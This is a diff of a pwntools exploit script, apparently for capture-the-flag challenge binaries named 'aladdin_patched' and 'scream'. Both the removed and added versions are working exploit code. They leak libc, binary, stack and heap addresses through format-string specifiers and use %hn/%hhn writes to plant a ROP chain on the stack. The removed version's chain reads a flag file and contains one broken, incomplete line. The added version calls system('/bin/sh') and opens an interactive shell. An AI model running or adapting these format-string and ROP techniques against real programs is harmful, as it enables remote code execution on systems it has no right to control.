@@ -1,43 +1,47 @@
 from pwn import *
 
 context.log_level = 'debug'
-r = process("./aladdin_patched")
-libc = ELF("./libc.so.6")
-elf  = ELF("./aladdin_patched")
+r = process("./scream")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+elf  = ELF("./scream")
 
-r.sendafter(b"wish:\n", b'%15$p %17$p %7$p ')
-libc.address = int(r.recvuntil(b' ').decode(), 16)-(0x7ffff7dbcd90-0x7ffff7d93000)
-elf.address = int(r.recvuntil(b' ').decode(), 16)
-stack_addr = int(r.recvuntil(b' ').decode(), 16) - 0x100
-print(f"libc addr: {hex(libc.address)}")
-print(f"elf addr: {hex(elf.address)}")
-print(f"stack addr: {hex(stack_addr)}")
+r.sendlineafter(b"> ", b'%15$p,%9$p,%8$p,%6$p,')
+libc_base = int(r.recvuntil(b',').decode()[:-1], 16) - 0x29d90
+elf.address = int(r.recvuntil(b',').decode()[:-1], 16) - 0x12f7
+stack_addr = int(r.recvuntil(b',').decode()[:-1], 16)
+heap_addr = int(r.recvuntil(b',').decode()[:-1], 16)
+print(f"libc addr: {hex(libc_base)}\nelf addr: {hex(elf.address)}")
+print(f"stack addr: {hex(stack_addr)}\nheap addr: {hex(heap_addr)}")
 
-# b *(main+429)
-r.sendafter(b"wish:\n", f"%{(stack_addr+0x38)&0xffff}c%19$hn".encode())
-r.sendafter(b"wish:\n", f"%{0x89&0xff}c%49$hhn".encode())
-pause()
+# gdb.attach(r, "b *fun+0x11e5-0x1199\nb *fun+0x1222-0x1199\nb *fun+0x125f-0x1199")
 
-leave_ret = elf.address+0x1425
-pop_rdi = libc.address + 0x000000000002a3e5 # pop rdi ; ret
-pop_rsi = libc.address + 0x000000000002be51 # pop rsi ; ret
-pop_rdx = libc.address + 0x00000000000796a2 # pop rdx ; ret
-pop_rax = libc.address + 0x0000000000045eb0 # pop rax ; ret
-syscall = libc.sym['getpid'] + 9
+r.sendlineafter(b"> ", f"%{(stack_addr-0x28)&0xffff}c%10$hn".encode())
+r.sendlineafter(b"> ", f"%{(elf.sym['main']+0x4b)&0xff}c%49$hhn".encode())
 
-for i in range(8):
-    bt = 
-    r.sendafter(b":\n", f"%{(stack_addr-0x18+i)&0xff}c%19$hhn".encode())
-    r.sendafter(b":\n", f"%{v}c%49$hhn".encode())
-for i, v in enumerate(p64(leave_ret)[:6]):
-    r.sendafter(b":\n", f"%{(stack_addr-0x10+i)&0xff}c%19$hhn".encode())
-    r.sendafter(b":\n", f"%{v}c%49$hhn".encode())
- 
-pay  = b'one more wish'.ljust(0x10, b'\x00') + b'flag'.ljust(8, b'\x00')
-pay += flat([pop_rdi, elf.sym['wish']+0x10, pop_rsi, 0, pop_rax, 2, syscall,
-             pop_rdi, 3, pop_rsi, elf.sym['wish']+0x100, pop_rdx, 0x50, pop_rax,0, syscall,
-             pop_rdi, 1, pop_rax, 1, syscall
-])
-r.sendafter(b"wish:\n", pay)
+def write_bytes(addr, value):
+    for i in range(8):
+        bt = (value>>(i*8))&0xff
+        if bt == 0: continue
+        r.sendlineafter(b"> ", f"%{(elf.sym['main']+0x4b)&0xff}c%49$hhn".encode())
+        r.sendlineafter(b"> ", f"%{(addr&0xffff)+i}c%36$hn".encode())
+        r.sendlineafter(b"> ", f"%{bt}c%51$hhn".encode())
+        print(f"written byte: {hex(bt)} to address {hex(addr+i)}")
+
+pop_rdi = libc_base + 0x2a3e5
+ret_addr = libc_base + 0x29139
+sh_addr = libc_base+next(libc.search(b'/bin/sh'))
+sys_addr = libc_base+libc.symbols['system']
+
+write_bytes(stack_addr+0x8, pop_rdi)
+write_bytes(stack_addr+0x10, sh_addr)
+write_bytes(stack_addr+0x18, ret_addr)
+write_bytes(stack_addr+0x20, sys_addr)
+
+print(f"shell addr: {hex(sh_addr)}")
+print(f"system addr: {hex(sys_addr)}")
+
+r.sendlineafter(b"> ", b"")
+r.sendlineafter(b"> ", b"")
+r.sendlineafter(b"> ", b"")
 
 r.interactive()
